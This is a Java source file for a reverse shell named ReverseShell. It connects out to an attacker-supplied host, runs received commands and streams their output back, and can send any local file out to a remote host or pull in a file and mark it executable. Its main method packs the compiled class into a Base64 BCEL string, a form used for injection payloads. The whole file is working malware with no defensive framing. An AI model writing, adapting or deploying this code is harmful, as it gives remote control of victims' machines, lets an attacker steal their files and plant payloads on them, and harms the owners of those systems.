import com.sun.org.apache.bcel.internal.classfile.Utility;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;

public class ReverseShell implements Runnable {

    private String ip;
    private Integer port;

    private InputStream inputStream;
    private OutputStream outputStream;

    public ReverseShell(String ip, Integer port) {
        this.ip = ip;
        this.port = port;
        new Thread(this).start();
    }

    public ReverseShell(InputStream inputStream, OutputStream outputStream) {
        this.inputStream = inputStream;
        this.outputStream = outputStream;
        new Thread(this).start();
    }

    @Override
    public void run() {
        if (outputStream != null && inputStream != null) {
            try {
                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream));
                BufferedReader read = new BufferedReader(new InputStreamReader(inputStream));
                String line2;
                while ((line2 = read.readLine()) != null) {
                    bufferedWriter.write(line2);
                    bufferedWriter.newLine();
                    bufferedWriter.flush();
                }
            } catch (Exception e) {}
        } else {
            try {
                Socket socket = new Socket(ip, port);
                BufferedWriter bufferedWriter = new BufferedWriter(
                    new OutputStreamWriter(socket.getOutputStream()));
                bufferedWriter.write("success!");
                bufferedWriter.newLine();
                bufferedWriter.flush();

                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                while (true) {
                    String line = bufferedReader.readLine();
                    if (line.equals("exit"))
                        return;
                    Process pro = null;
                    try {
                        if (line.startsWith("${IFS}")) {
                            line = line.substring(6);
                            String[] cmd = line.split("\\$\\{IFS\\}");
                            pro = Runtime.getRuntime().exec(cmd);
                        } else if (line.startsWith("download")) {
                            line = line.substring(8).trim();
                            String[] cmd = line.split(" ");
                            String file = cmd[0];
                            String ip = cmd[1];
                            String port = cmd[2];
                            byte[] bytes = Files.readAllBytes(Paths.get(file));
                            Socket transferFileSocket = new Socket(ip, Integer.parseInt(port));
                            transferFileSocket.getOutputStream().write(bytes);
                            transferFileSocket.getOutputStream().flush();
                            transferFileSocket.getOutputStream().close();
                            transferFileSocket.close();
                        } else if (line.startsWith("upload")) {
                            line = line.substring(6).trim();
                            String[] cmd = line.split(" ");
                            String file = cmd[0];
                            String ip = cmd[1];
                            String port = cmd[2];
                            Socket transferFileSocket = new Socket(ip, Integer.parseInt(port));
                            InputStream inputStream = transferFileSocket.getInputStream();
                            Path path = Paths.get(file);
                            Files.copy(inputStream, path);
                            if (Files.exists(path)) {
                                File toSetFile = path.toFile();
                                toSetFile.setExecutable(true);
                                toSetFile.setReadable(true);
                                toSetFile.setWritable(true);
                            }
                            inputStream.close();
                            transferFileSocket.close();
                        } else {
                            pro = Runtime.getRuntime().exec(line);
                        }
                    } catch (Exception e) {
                        bufferedWriter.write(e.getMessage());
                        bufferedWriter.newLine();
                        bufferedWriter.flush();
                    }
                    if (pro == null) {
                        continue;
                    }

                    new ReverseShell(pro.getInputStream(), socket.getOutputStream());
                    new ReverseShell(pro.getErrorStream(), socket.getOutputStream());
                }

            } catch (IOException e) {}
        }
    }

    public static void main(String[] args) throws Exception {
        InputStream inputStream = ReverseShell.class.getResourceAsStream("ReverseShell.class");
        byte[] bytes = new byte[inputStream.available()];
        inputStream.read(bytes);
        String code = Utility.encode(bytes, true);
        System.out.println(Base64.getEncoder().encodeToString(("$$BCEL$$" + code).getBytes()));
//        new ReverseShell("127.0.0.1", 12345);
    }
}